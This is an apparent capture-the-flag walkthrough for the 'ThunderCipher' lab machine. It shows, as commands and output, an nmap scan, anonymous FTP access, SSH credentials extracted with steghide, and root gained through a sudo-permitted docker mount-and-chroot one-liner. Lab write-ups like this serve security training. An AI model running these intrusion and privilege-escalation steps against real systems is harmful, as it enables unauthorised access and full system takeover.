# **StegoVault - ThunderCipher**

*Target Ip. Address: 192.168.5.131*

Let's start with a nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.131
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 14:38 IST
Nmap scan report for 192.168.5.131
Host is up (0.00018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           13414 Sep 24 11:25 cmd.jpeg
|_drwxrwxrwx    2 0        0            4096 Sep 28 12:06 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.212
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e8:cf:b0:69:43:48:42:58:3a:04:67:b6:da:b7:c5:d8 (ECDSA)
|_  256 63:95:8f:b5:ac:19:2e:a2:02:c9:a2:65:24:4d:c4:8f (ED25519)
MAC Address: BC:24:11:26:55:38 (Proxmox Server Solutions GmbH)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
```

We have 2 open ports. Port 21 (ftp with anonymous) and Port 22 (ssh).

```bash
kali@kali:ftp 192.168.5.131
Connected to 192.168.5.131.
220 (vsFTPd 3.0.5)
Name (192.168.5.131:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51072|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           13414 Sep 24 11:25 cmd.jpeg
drwxrwxrwx    2 0        0            4096 Sep 28 12:06 upload
226 Directory send OK.
ftp> get cmd.jpeg
local: cmd.jpeg remote: cmd.jpeg
229 Entering Extended Passive Mode (|||24212|)
150 Opening BINARY mode data connection for cmd.jpeg (13414 bytes).
100% |******************************************************************************************| 13414      103.16 MiB/s    00:00 ETA
226 Transfer complete.
13414 bytes received in 00:00 (188.44 KiB/s)
ftp>
```

We download a jpeg file, but upload directory is empty.

We have a jpeg file, room name also suggests this has to be a stegnography.

```bash
kali@kali:steghide --extract -sf cmd.jpeg 
Enter passphrase: 
wrote extracted data to "creds.txt".
```

That was no passphrase steghide.

```bash
kali@kali:cat creds.txt                                                                                                                      
ssh user: stego / password: St...s!
```

We have ssh credentials. Let's login via ssh as user stego.

```bash
kali@kali:ssh stego@192.168.5.131                                                                                                            
The authenticity of host '192.168.5.131 (192.168.5.131)' can't be established.
ED25519 key fingerprint is: SHA256:wByD1NlrahFUA5tiP7XfDN4EyWcunG21hZogswDQyX0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.131' (ED25519) to the list of known hosts.
stego@192.168.5.131's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 11 09:11:38 AM UTC 2026

  System load:  0.05               Processes:              109
  Usage of /:   35.4% of 14.66GB   Users logged in:        0
  Memory usage: 10%                IPv4 address for ens18: 192.168.5.131
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

97 updates can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Sep 28 16:27:00 2025 from 192.168.1.7
stego@thundercipher:~$
```

We are in. We have user flag at home directory.

```bash
stego@thundercipher:~$ cat user.txt
ThunderCipher{FT.....ss}
```

Let's check the sudo privileges.

```bash
stego@thundercipher:~$ sudo -l
[sudo] password for stego: 
Matching Defaults entries for stego on thundercipher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User stego may run the following commands on thundercipher:
    (ALL) /usr/bin/docker
```

We can use /usr/bin/docker as root. Quick look on "*https://gtfobins.org/gtfobins/docker/*, we can use ot for privilege escalation.

```bash
stego@thundercipher:~$ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

We are root. Let's read final flag at root directory and end this challenge.

```bash
# cat root.txt
ThunderCipher{Cr.....te}
```
